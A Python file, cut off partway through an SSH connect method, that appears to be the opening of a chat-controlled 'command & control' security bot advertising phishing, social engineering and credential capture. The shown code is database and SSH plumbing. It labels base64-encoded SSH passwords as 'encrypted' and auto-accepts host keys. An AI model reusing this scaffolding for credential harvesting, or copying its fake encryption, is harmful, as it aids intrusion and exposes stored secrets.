#!/usr/bin/env python3
"""
👑 LORD-SPYK3-BOT V8 👑
Author: Ian Carter Kulani
DescriptiCybersecurity Command & Control Server
Features:
    - 4000+ Security Commands
    - Full Nmap Integration (All scan types)
    - Complete Curl/Wget/Netcat Commands
    - Shodan & Hunter.io Integration
    - SSH Remote Access via Discord/Telegram/WhatsApp/Signal/Slack/iMessage
    - REAL Traffic Generation & Web Vulnerability Scanning
    - Social Engineering Suite
    - IP Management & Threat Detection
    - Multi-Platform Integration
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import paramiko
import stat
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor
from collections import Counter
import io
import argparse

# Data visualization imports
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
import matplotlib.patches as mpatches
from matplotlib.patches import Circle, Wedge
import seaborn as sns
import numpy as np

from http.server import BaseHTTPRequestHandler, HTTPServer

# PDF generation
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter, A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib.enums import TA_CENTER, TA_LEFT

# Optional imports with fallbacks
try:
    import discord
    from discord.ext import commands, tasks
    from discord import File, Embed, Color
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# Scapy for advanced packet generation
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP
    from scapy.all import send, sr1, srloop, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WhatsApp Integration
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Signal Integration
SIGNAL_CLI_AVAILABLE = shutil.which('signal-cli') is not None

# For QR code generation
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# For URL shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# For iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin' and shutil.which('osascript') is not None

# For Shodan
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

# For Hunter.io
try:
    import pyhunter
    HUNTER_AVAILABLE = True
except ImportError:
    HUNTER_AVAILABLE = False

# =====================
# SPYK3 THEME (Purple/Black)
# =====================
class SpyTheme:
    """Spy-themed color scheme (purple/black)"""
    
    if COLORAMA_AVAILABLE:
        PURPLE1 = Fore.MAGENTA + Style.BRIGHT
        PURPLE2 = Fore.LIGHTMAGENTA_EX + Style.BRIGHT
        PURPLE3 = Fore.LIGHTBLUE_EX + Style.BRIGHT
        PURPLE4 = Fore.BLUE + Style.BRIGHT
        BLACK = Fore.BLACK + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        CYAN = Fore.CYAN + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        RED = Fore.RED + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        BLUE = Fore.BLUE + Style.BRIGHT
        RESET = Style.RESET_ALL
        
        PRIMARY = PURPLE1
        SECONDARY = PURPLE2
        ACCENT = PURPLE3
        HIGHLIGHT = PURPLE4
        SUCCESS = GREEN
        ERROR = RED
        WARNING = YELLOW
        INFO = CYAN
    else:
        PURPLE1 = PURPLE2 = PURPLE3 = PURPLE4 = ""
        BLACK = WHITE = CYAN = GREEN = RED = YELLOW = MAGENTA = BLUE = ""
        PRIMARY = SECONDARY = ACCENT = HIGHLIGHT = SUCCESS = ERROR = WARNING = INFO = RESET = ""

Colors = SpyTheme

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".lord_spyk3"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
WHATSAPP_CONFIG_FILE = os.path.join(CONFIG_DIR, "whatsapp_config.json")
SLACK_CONFIG_FILE = os.path.join(CONFIG_DIR, "slack_config.json")
SIGNAL_CONFIG_FILE = os.path.join(CONFIG_DIR, "signal_config.json")
IMESSAGE_CONFIG_FILE = os.path.join(CONFIG_DIR, "imessage_config.json")
SHODAN_CONFIG_FILE = os.path.join(CONFIG_DIR, "shodan_config.json")
HUNTER_CONFIG_FILE = os.path.join(CONFIG_DIR, "hunter_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "spyk3_data.db")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
LOG_FILE = os.path.join(CONFIG_DIR, "spyk3.log")
REPORT_DIR = "spyk3_reports"
SCAN_RESULTS_DIR = os.path.join(REPORT_DIR, "scans")
BLOCKED_IPS_DIR = os.path.join(REPORT_DIR, "blocked")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
ALERTS_DIR = "alerts"
MONITORING_DIR = "monitoring"
BACKUPS_DIR = "backups"
TEMP_DIR = "temp"
SCRIPTS_DIR = "scripts"
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
PHISHING_LOGS_DIR = os.path.join(CONFIG_DIR, "phishing_logs")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
SSH_LOGS_DIR = os.path.join(CONFIG_DIR, "ssh_logs")
TIME_HISTORY_DIR = os.path.join(CONFIG_DIR, "time_history")
SHODAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "shodan_results")
HUNTER_RESULTS_DIR = os.path.join(CONFIG_DIR, "hunter_results")
SSH_SESSIONS_DIR = os.path.join(CONFIG_DIR, "ssh_sessions")
SSH_TRANSFERS_DIR = os.path.join(CONFIG_DIR, "ssh_transfers")

# Create directories
directories = [
    CONFIG_DIR, REPORT_DIR, SCAN_RESULTS_DIR, BLOCKED_IPS_DIR, GRAPHICS_DIR,
    ALERTS_DIR, MONITORING_DIR, BACKUPS_DIR, TEMP_DIR, SCRIPTS_DIR,
    NIKTO_RESULTS_DIR, WHATSAPP_SESSION_DIR, TRAFFIC_LOGS_DIR,
    PHISHING_DIR, PHISHING_TEMPLATES_DIR, PHISHING_LOGS_DIR,
    CAPTURED_CREDENTIALS_DIR, SSH_KEYS_DIR, SSH_LOGS_DIR,
    TIME_HISTORY_DIR, SHODAN_RESULTS_DIR, HUNTER_RESULTS_DIR,
    SSH_SESSIONS_DIR, SSH_TRANSFERS_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - LORD-SPYK3 - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("LordSpyk3")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """Unified SQLite database manager"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize all database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS time_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                user TEXT,
                result TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                services TEXT,
                os_info TEXT,
                vulnerabilities TEXT,
                execution_time REAL
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS shodan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                ip TEXT NOT NULL,
                ports TEXT,
                hostnames TEXT,
                country TEXT,
                city TEXT,
                org TEXT,
                os TEXT,
                vulnerabilities TEXT,
                raw_data TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS hunter_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                domain TEXT NOT NULL,
                emails TEXT,
                total_emails INTEGER,
                pattern TEXT,
                organization TEXT,
                raw_data TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                blocked_date TIMESTAMP,
                threat_level INTEGER DEFAULT 0,
                last_scan TIMESTAMP,
                scan_count INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS ip_blocks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                ip_address TEXT NOT NULL,
                action TEXT NOT NULL,
                reason TEXT,
                executed_by TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT,
                error TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                error TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id TEXT PRIMARY KEY,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                success BOOLEAN DEFAULT 1
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS ssh_transfers (
                id TEXT PRIMARY KEY,
                connection_id TEXT NOT NULL,
                local_path TEXT NOT NULL,
                remote_path TEXT NOT NULL,
                direction TEXT NOT NULL,
                size INTEGER,
                status TEXT,
                started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                completed_at TIMESTAMP,
                error TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS ssh_authorized_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT NOT NULL,
                user_id TEXT NOT NULL,
                username TEXT,
                authorized BOOLEAN DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
    
    # ==================== Command History Methods ====================
    def log_command(self, command: str, source: str = "local", success: bool = True,
                   output: str = "", execution_time: float = 0.0):
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT command, source, timestamp, success FROM command_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    # ==================== Threat Methods ====================
    def log_threat(self, threat_type: str, source_ip: str, severity: str, 
                   description: str, action_taken: str):
        try:
            self.cursor.execute('''
                INSERT INTO threats (threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?)
            ''', (threat_type, source_ip, severity, description, action_taken))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    # ==================== Scan Methods ====================
    def log_scan(self, target: str, scan_type: str, open_ports: List[Dict], 
                 execution_time: float = 0.0, vulnerabilities: List[Dict] = None):
        try:
            open_ports_json = json.dumps(open_ports) if open_ports else "[]"
            vulns_json = json.dumps(vulnerabilities) if vulnerabilities else "[]"
            self.cursor.execute('''
                INSERT INTO scans (target, scan_type, open_ports, vulnerabilities, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (target, scan_type, open_ports_json, vulns_json, execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log scan: {e}")
    
    def get_recent_scans(self, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM scans ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get scans: {e}")
            return []
    
    # ==================== IP Management Methods ====================
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes)
                VALUES (?, ?, ?)
            ''', (ip, added_by, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def remove_managed_ip(self, ip: str) -> bool:
        try:
            self.cursor.execute('''
                DELETE FROM managed_ips WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to remove managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason, ip))
            
            self.cursor.execute('''
                INSERT INTO ip_blocks (ip_address, action, reason, executed_by)
                VALUES (?, ?, ?, ?)
            ''', (ip, "block", reason, executed_by))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 0, block_reason = NULL, blocked_date = NULL
                WHERE ip_address = ?
            ''', (ip,))
            
            self.cursor.execute('''
                INSERT INTO ip_blocks (ip_address, action, reason, executed_by)
                VALUES (?, ?, ?, ?)
            ''', (ip, "unblock", "Manually unblocked", executed_by))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                self.cursor.execute('''
                    SELECT * FROM managed_ips ORDER BY added_date DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM managed_ips WHERE ip_address = ?
            ''', (ip,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get IP info: {e}")
            return None
    
    # ==================== Traffic Log Methods ====================
    def log_traffic(self, traffic_type: str, target_ip: str, duration: int,
                   packets_sent: int, bytes_sent: int, status: str, 
                   executed_by: str = "system", error: str = None):
        try:
            self.cursor.execute('''
                INSERT INTO traffic_logs 
                (traffic_type, target_ip, duration, packets_sent, bytes_sent, status, executed_by, error)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (traffic_type, target_ip, duration, packets_sent, bytes_sent, status, executed_by, error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    def get_traffic_logs(self, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get traffic logs: {e}")
            return []
    
    # ==================== SSH Methods ====================
    def save_ssh_connection(self, conn_id: str, name: str, host: str, username: str,
                           port: int = 22, password: str = None, key_path: str = None) -> bool:
        try:
            password_encrypted = base64.b64encode(password.encode()).decode() if password else None
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_connections 
                (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (conn_id, name, host, port, username, password_encrypted, key_path, "disconnected"))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save SSH connection: {e}")
            return False
    
    def get_ssh_connection(self, conn_id: str) -> Optional[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM ssh_connections WHERE id = ?
            ''', (conn_id,))
            row = self.cursor.fetchone()
            if row:
                conn = dict(row)
                if conn.get('password_encrypted'):
                    try:
                        conn['password'] = base64.b64decode(conn['password_encrypted']).decode()
                    except:
                        pass
                return conn
            return None
        except Exception as e:
            logger.error(f"Failed to get SSH connection: {e}")
            return None
    
    def get_ssh_connection_by_name(self, name: str) -> Optional[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM ssh_connections WHERE name = ?
            ''', (name,))
            row = self.cursor.fetchone()
            if row:
                conn = dict(row)
                if conn.get('password_encrypted'):
                    try:
                        conn['password'] = base64.b64decode(conn['password_encrypted']).decode()
                    except:
                        pass
                return conn
            return None
        except Exception as e:
            logger.error(f"Failed to get SSH connection by name: {e}")
            return None
    
    def get_all_ssh_connections(self) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM ssh_connections ORDER BY created_at DESC
            ''')
            connections = []
            for row in self.cursor.fetchall():
                conn = dict(row)
                if conn.get('password_encrypted'):
                    try:
                        conn['password'] = base64.b64decode(conn['password_encrypted']).decode()
                    except:
                        pass
                connections.append(conn)
            return connections
        except Exception as e:
            logger.error(f"Failed to get SSH connections: {e}")
            return []
    
    def update_ssh_connection_status(self, conn_id: str, status: str, error: str = None):
        try:
            self.cursor.execute('''
                UPDATE ssh_connections 
                SET status = ?, last_used = CURRENT_TIMESTAMP, error = ?
                WHERE id = ?
            ''', (status, error, conn_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update SSH connection status: {e}")
    
    def delete_ssh_connection(self, conn_id: str) -> bool:
        try:
            self.cursor.execute('''
                DELETE FROM ssh_connections WHERE id = ?
            ''', (conn_id,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to delete SSH connection: {e}")
            return False
    
    def save_ssh_command(self, cmd_id: str, connection_id: str, command: str,
                         output: str, exit_code: int, execution_time: float, success: bool):
        try:
            self.cursor.execute('''
                INSERT INTO ssh_commands 
                (id, connection_id, command, output, exit_code, execution_time, success)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (cmd_id, connection_id, command, output[:5000], exit_code, execution_time, success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save SSH command: {e}")
    
    def get_ssh_commands(self, connection_id: str = None, limit: int = 50) -> List[Dict]:
        try:
            if connection_id:
                self.cursor.execute('''
                    SELECT * FROM ssh_commands 
                    WHERE connection_id = ? 
                    ORDER BY timestamp DESC LIMIT ?
                ''', (connection_id, limit))
            else:
                self.cursor.execute('''
                    SELECT * FROM ssh_commands 
                    ORDER BY timestamp DESC LIMIT ?
                ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH commands: {e}")
            return []
    
    def save_ssh_transfer(self, transfer_id: str, connection_id: str, local_path: str,
                          remote_path: str, direction: str, size: int, status: str,
                          started_at: str, error: str = None):
        try:
            self.cursor.execute('''
                INSERT INTO ssh_transfers 
                (id, connection_id, local_path, remote_path, direction, size, status, started_at, error)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (transfer_id, connection_id, local_path, remote_path, direction, size, status, started_at, error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save SSH transfer: {e}")
    
    def update_ssh_transfer(self, transfer_id: str, status: str, completed_at: str = None, error: str = None):
        try:
            self.cursor.execute('''
                UPDATE ssh_transfers 
                SET status = ?, completed_at = ?, error = ?
                WHERE id = ?
            ''', (status, completed_at, error, transfer_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update SSH transfer: {e}")
    
    def get_ssh_transfers(self, connection_id: str = None, limit: int = 20) -> List[Dict]:
        try:
            if connection_id:
                self.cursor.execute('''
                    SELECT * FROM ssh_transfers 
                    WHERE connection_id = ? 
                    ORDER BY started_at DESC LIMIT ?
                ''', (connection_id, limit))
            else:
                self.cursor.execute('''
                    SELECT * FROM ssh_transfers 
                    ORDER BY started_at DESC LIMIT ?
                ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH transfers: {e}")
            return []
    
    # ==================== SSH Authorization Methods ====================
    def authorize_ssh_user(self, platform: str, user_id: str, username: str = None) -> bool:
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_authorized_users (platform, user_id, username, authorized)
                VALUES (?, ?, ?, 1)
            ''', (platform, user_id, username))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to authorize SSH user: {e}")
            return False
    
    def revoke_ssh_user(self, platform: str, user_id: str) -> bool:
        try:
            self.cursor.execute('''
                UPDATE ssh_authorized_users SET authorized = 0 WHERE platform = ? AND user_id = ?
            ''', (platform, user_id))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to revoke SSH user: {e}")
            return False
    
    def is_ssh_user_authorized(self, platform: str, user_id: str) -> bool:
        try:
            self.cursor.execute('''
                SELECT authorized FROM ssh_authorized_users 
                WHERE platform = ? AND user_id = ? AND authorized = 1
            ''', (platform, user_id))
            return self.cursor.fetchone() is not None
        except Exception as e:
            logger.error(f"Failed to check SSH user authorization: {e}")
            return False
    
    def get_authorized_ssh_users(self, platform: str = None) -> List[Dict]:
        try:
            if platform:
                self.cursor.execute('''
                    SELECT * FROM ssh_authorized_users WHERE platform = ? AND authorized = 1
                ''', (platform,))
            else:
                self.cursor.execute('''
                    SELECT * FROM ssh_authorized_users WHERE authorized = 1
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get authorized SSH users: {e}")
            return []
    
    # ==================== Statistics Methods ====================
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM scans')
            stats['total_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['total_nikto_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM shodan_results')
            stats['total_shodan_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM hunter_results')
            stats['total_hunter_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips')
            stats['total_managed_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1')
            stats['total_blocked_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['total_traffic_tests'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_connections')
            stats['total_ssh_connections'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_commands')
            stats['total_ssh_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_transfers')
            stats['total_ssh_transfers'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_authorized_users WHERE authorized = 1')
            stats['authorized_ssh_users'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def close(self):
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    """SSH connection manager for remote command execution"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager
        self.connections: Dict[str, paramiko.SSHClient] = {}
        self.sftp_clients: Dict[str, paramiko.SFTPClient] = {}
        self.lock = threading.Lock()
        self.paramiko_available = True
        
        try:
            import paramiko
        except ImportError:
            self.paramiko_available = False
            print(f"{Colors.WARNING}⚠️ paramiko not available. SSH features disabled.{Colors.RESET}")
    
    def is_available(self) -> bool:
        return self.paramiko_available
    
    def create_connection(self, name: str, host: str, username: str, 
                          port: int = 22, password: str = None, key_path: str = None) -> str:
        if not self.paramiko_available:
            return None
        
        conn_id = str(uuid.uuid4())[:8]
        self.db.save_ssh_connection(conn_id, name, host, username, port, password, key_path)
        return conn_id
    
    def connect(self, conn_id: str, timeout: int = 30) -> bool:
        if not self.paramiko_available:
            return False
        
        conn_data = self.db.get_ssh_connection(conn_id)
        if not conn_data:
            return False
        
        try:
            self.db.update_ssh_connection_status(conn_id, "connecting")
            
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': timeout,
                'allow_agent': True,
                'look_for_keys': True
            }
            
            if conn_data.get('password'):
                connect_kwargs['password'] = conn_data['password']
            
            if conn_data.get('key_path') and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            
            client.connect(**connect_kwargs)
            
            with self.lock:
                self.connections[conn_id] = client
            
